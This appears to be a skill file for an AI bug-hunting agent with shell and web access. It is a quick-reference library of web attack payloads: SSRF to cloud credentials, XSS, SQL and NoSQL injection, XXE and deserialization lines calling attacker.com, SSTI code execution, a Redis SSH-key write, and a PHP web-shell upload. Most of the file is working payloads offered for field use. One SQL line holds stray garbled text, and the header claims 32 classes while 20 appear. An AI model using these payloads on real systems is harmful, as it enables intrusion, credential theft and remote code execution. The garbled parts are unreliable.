---
name: payload-library
description: Centralized unified payload library for all 32 vulnerability classes — top 5-10 payloads per class for fast field reference
tools:
  - Bash
  - WebFetch
  - WebSearch
  - Read
triggers:
  - payload library
  - payload list
  - pay load
  - payloads all
  - skills payloads
---

# Unified Payload Library — 32 Vulnerability Classes

Quick-reference payloads extracted from all 32 deep-dive files. Use this for fast field testing.

## 1. SSRF Payloads

### Cloud Metadata Endpoints
```bash
# AWS
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data/

# GCP  
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/project/project-id

# Azure
http://169.254.169.254/metadata/instance?api-version=2017-08-01

# DigitalOcean
http://169.254.169.254/metadata/v1.json
```

### Protocol Handlers
```
gopher://127.0.0.1:6379/_<payload>    # Redis SMTP/SSH key write
file:///etc/passwd                      # LFI via SSRF
dict://127.0.0.1:6379/info             # Redis info via dict
ftp://attacker.com/                     # FTP redirect SSRF
ldap://127.0.0.1:389/                  # LDAP SSRF
```

## 2. XSS Payloads

### Polyglot (works everywhere)
```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(1) )//%0D%0A</sTyle>/<sCript>/<tiTle>/<teXtarEa>/
```

### WAF Bypass Short
```html
"><img src=x onerror=alert(1)>
```

### CSP Bypass
```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.1/angular.js">
<div ng-app ng-csp ng-click="$event.view.alert(1)">Click</div>
```

## 3. SQL Injection Payloads

### Time-Based (All DBMS)
```sql
MySQL:  ' OR SLEEP(5)--
PG:     ' OR pg_sleep(5)--
MSSQL:  ' WAITFOR DELAY '0:0:5'--
Oracle: ' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('x',5)--
SQLite: ' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000/2))))--
```

### Boolean Blind
```sql
' AND 1=1--  ʜᴛ ᴛᴘꜱ://ᴡᴡᴡ. --> true
' AND 1=2--  --> false
```

### Auth Bypass
```sql
' OR 1=1--
admin'--
' UNION SELECT 1,2,3--
```

## 4. IDOR Payloads

### Parameter Manipulation
```
Change user_id=123 to 124, 125
Change ?id=abc → ?id[]=abc
Change /api/user/123 → /api/user/me
Change GET to POST/PUT/DELETE
Add X-Original-URL: /admin/users
```

## 5. Open Redirect Bypasses

```bash
# Standard
?url=https://evil.com
?next=//evil.com
?redirect=/../../../evil.com

# Bypass patterns
https://target.com@evil.com
https://evil.com#@target.com
https://target.com.evil.com
https://target.com%40evil.com
https://target.com\@evil.com
?url=//evil%40.com          # Double encoding
?url=%68%74%74%70%73://evil.com  # URL encode
```

## 6. JWT Attacks

```bash
# Change algorithm
{"alg":"none","typ":"JWT"}   → no signature
{"alg":"HS256","typ":"JWT"}  → use public key as HMAC secret

# KID injection
{"kid":"../../../../etc/passwd"}  # path traversal
{"kid":"keyfile;ls"}              # command injection
```

## 7. NoSQL Injection (MongoDB)

```javascript
// Login bypass
{"username": {"$ne": null}, "password": {"$ne": null}}
{"$where": "sleep(5000)"}

// Extract data character by character
{"username": {"$regex": "^a"}}
{"username": {"$gt": ""}}
```

## 8. Prototype Pollution

```javascript
// Node.js
{"__proto__": {"admin": true}}
{"constructor": {"prototype": {"isAdmin": true}}}

// Browser
Object.prototype.admin = true
Object.prototype.isAdmin = true
```

## 9. XXE Payloads

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>

<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/">]>
<root>&xxe;</root>

<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">]>
```

## 10. SSTI Payloads

```bash
# Jinja2 (Python)
{{config}}
{{''.__class__.__mro__[2].__subclasses__()}}
{{''.__class__.__mro__[1].__subclasses__()[X]('cat /etc/passwd',shell=True,stdout=-1).communicate()}}

# Freemarker (Java)  
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("cat /etc/passwd")}

# Twig (PHP)
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

## 11. Command Injection Payloads

```bash
;id
|id
`id`
$(id)
||id
& id
%0aid%0a
```

## 12. Deserialization Payloads

```bash
# PHP: Basic POP chain via unserialize
O:8:"stdClass":0:{}

# Java: ysoserial
java -jar ysoserial.jar CommonsCollections5 'curl http://attacker.com/' | base64

# Python pickle
cos\nsystem\n(S'id'\ntR.

# Ruby Marshal  
Marshal.dump(system('id'))
```

## 13. CRLF Injection / Request Smuggling

```bash
# CRLF in header
%0d%0aInjected-Header: value

# Response splitting
%0d%0aContent-Length: 0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0a...

# CL.TE smuggling
Transfer-Encoding: chunked
Content-Length: 4

1e
X
```

## 14. Web Cache Poisoning

```bash
# Unkeyed header test
X-Forwarded-Host: evil.com
X-Original-URL: /admin
Cookie: session=evil<script>
```

## 15. SSRF → RCE via Redis

```
gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aSET%0d%0a$4%0d%0ashell%0d%0a$XX%0d%0assh-rsa%20AAA...%0d%0a*4%0d%0a$6%0d%0aCONFIG%0d%0a$3%0d%0aSET%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/root/.ssh/%0d%0a*4%0d%0a$6%0d%0aCONFIG%0d%0a$3%0d%0aSET%0d%0a$10%0d%0adbfilename%0d%0a$18%0d%0aauthorized_keys%0d%0a*1%0d%0a$4%0d%0aSAVE%0d%0a
```

## 16. Authentication Bypass

```bash
# Default creds
admin:admin
admin:password
root:root

# Generic wrappers
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Original-URL: /admin
```

## 17. Race Condition Payloads

```bash
# Turbo Intruder setup
# Send all requests in parallel
for i in {1..50}; do curl -X POST https://target.com/api/coupon/redeem -d "code=DISCOUNT50" &; done; wait
```

## 18. GraphQL Injection

```graphql
# Introspection
query { __schema { types { name fields { name } } } }

# Batching for brute force
[{"query":"query { user(id:1) { email } }"},{"query":"query { user(id:2) { email } }"}]
```

## 19. OAuth Attacks

```bash
# CSRF on OAuth
redirect_uri=https://evil.com/callback

# Covert redirect
redirect_uri=https://target.com@evil.com
redirect_uri=https://target.com.evil.com
```

## 20. File Upload Bypasses

```bash
# Extension bypass
shell.php%00.png
shell.php.
shell.pHp
shell.php;.jpg
shell.php\x00.png

# Content-Type bypass
Content-Type: image/jpeg

# Magic byte bypass
GIF89a<?php system($_GET['cmd']); ?>
```

## Quick Bash Command to Search This Library

```bash
# Search all payloads
grep -A 2 "^## [0-9]" /root/bb/ai-bug-hunter-v2/skills/web2-vuln-classes/payload-library.md

# Search by keyword
grep -i "sql\|noSQL\|sqli" /root/bb/ai-bug-hunter-v2/skills/web2-vuln-classes/payload-library.md

# Get payload for specific class
grep -A 10 "^## [0-9]*\. SSRF" /root/bb/ai-bug-hunter-v2/skills/web2-vuln-classes/payload-library.md
```
